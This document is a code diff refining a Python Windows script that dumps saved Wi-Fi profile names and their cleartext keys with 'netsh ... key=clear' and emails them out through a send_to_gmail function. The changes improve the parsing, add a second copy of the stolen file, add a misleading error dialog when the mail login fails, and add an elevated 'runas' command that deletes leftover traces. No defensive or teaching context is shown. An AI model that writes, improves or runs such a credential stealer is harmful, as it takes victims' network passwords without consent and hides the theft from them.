@@ -7,6 +7,7 @@ import win32com.shell.shell as shell
 from email.message import EmailMessage 
 from tkinter import messagebox
 
+
 def send_to_gmail(file):
     msg = EmailMessage()
     msg['Subject'] = 'Here you go'
@@ -27,10 +28,11 @@ def send_to_gmail(file):
 def main_process():
     try:
         profiles = []
-        paswords = []
+        passwords = []
         pass_files = []
 
         file = open('C:\\Users\\' + os.environ['USERNAME'] + '\\file.txt', 'w')
+        file2 = open('file.txt', 'w')
         path_profile = 'C:\\Users\\' + os.environ['USERNAME'] + '\\profiles.txt'
 
         os.system('netsh wlan show profile > ' + path_profile)
@@ -41,19 +43,26 @@ def main_process():
             if ':' in i:
                 prof = i.split(':')[1]
                 if prof != '':
-                    profiles.append(prof)
+                    if len(prof.split()) != 1:
+                        profiles.append(" ".join(prof.split()))
+                    else:
+                        profiles.append(prof.split()[0])
 
         for i in range(len(profiles)):
-            os.system(f'netsh wlan show profile {profiles[i]} key=clear > C:\\Users\\' + os.environ['USERNAME'] + f'\\pass{i}.txt')
-            pass_files.append('C:\\Users\\' + os.environ['USERNAME'] + f'\\pass{i}.txt')
+            os.system(f'netsh wlan show profile name="{profiles[i]}" key=clear > ' + f'pass{i}.txt')
+            pass_files.append(f'pass{i}.txt')
             pass_data = (open(pass_files[i], 'r')).read().split()
             for j in range(len(pass_data)):
                 if 'Key' in pass_data[j] and 'Content' in pass_data[j+1]:
-                    paswords.append(pass_data[j+3])
+                    passwords.append(pass_data[j+3])
+                elif 'Key' in pass_data[j] and 'Index' in pass_data[j+1]:
+                    passwords.append('no key')
 
         for i in range(len(profiles)):
-            file.write(profiles[i] + ' : ' + paswords[i] + '\n')
+            file.write(profiles[i] + ' : ' + passwords[i] + '\n')
+            file2.write(profiles[i] + ' : ' + passwords[i] + '\n')
         file.close()
+        file2.close()
 
         send_to_gmail('file.txt')
 
@@ -68,6 +77,14 @@ def main_process():
         messagebox.showerror('Error', 'No internet connection')
         root.destroy()
         os.remove('C:\\Users\\' + os.environ['USERNAME'] + '\\file.txt')
+
+    except smtplib.SMTPAuthenticationError:
+
+        root = tkinter.Tk()
+        root.withdraw()
+        messagebox.showerror('Error', 'Services are not responding, try later')
+        root.destroy()
+
     finally:
         try:
             os.remove('C:\\Users\\' + os.environ['USERNAME'] + '\\profiles.txt')
@@ -76,6 +93,11 @@ def main_process():
                 os.remove(i)
         except FileNotFoundError:
             pass    
+        except PermissionError:
+            files_to_remove = []
+            for i in range(len(pass_files)):
+                files_to_remove.append('del ' + '"C:\\Users\\' + os.environ['USERNAME'] + f'\\pass{i}"')
+            shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c' + ("; ".join(files_to_remove)))
 
 if __name__ == '__main__':
     main_process()
